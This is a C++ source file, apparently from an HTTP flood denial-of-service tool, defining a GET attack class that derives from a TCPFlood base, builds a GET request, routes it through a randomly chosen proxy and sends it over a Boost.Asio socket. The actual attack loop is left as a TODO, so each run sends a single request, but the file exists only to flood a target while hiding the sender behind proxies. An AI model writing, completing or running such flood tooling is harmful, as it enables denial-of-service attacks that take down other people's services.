#include "../../include/methods/GET.h"

GET::GET(const string& address, const uint16_t& port)
	: TCPFlood(address, port)
	, requestRawPathQS("/") // TODO: find out parsing similar to Python's YARL
	, requestBody("")
{	
	this->setHeader(this->getDefaultHeader());
	
	this->createRequest(this->type, requestRawPathQS, requestBody);
	
	this->getTarget()->updateProxy(ProxyManager::getInstance()->getRandomProxy());
	
	this->initNetwork();

	if(network::State::CREATED <= this->getNetworkPtr()->getState())
	{
        this->setState(flood::State::READY);
        return;
    }
    
    this->setState(flood::State::ERROR);
}

void GET::enable()
{
	this->setState(flood::State::READY);
}

void GET::run()
{
	if(flood::State::READY != this->getState())
	{
		return;
	}
	this->setState(flood::State::RUNNING);

	// it is better to keep connection alive to avoid overhead	
    // https://stackoverflow.com/questions/20599570/is-it-better-to-keep-a-socket-open-for-frequent-requests-or-to-close-the-socket
    
    // TODO:
    // Implement proper logic of GET attack method here
    this->getNetworkPtr()->send(this->request);

	cout << endl<<">>" << this->request << "<<" <<endl;
    this->setState(flood::State::READY);
}

void GET::disable()
{
	this->setState(flood::State::HALT);
}

void GET::initNetwork()
{
    //this->networkPtr = new SocketGLIBC(this->getTarget()->getAddress(), this->getTarget()->getPort());
	this->networkPtr = new BoostAsio(this->getTarget()->getAddress(), this->getTarget()->getPort());
}

void GET::operator()()
{
    if(network::State::CREATED <= this->getNetworkPtr()->getState())
        this->run();
}
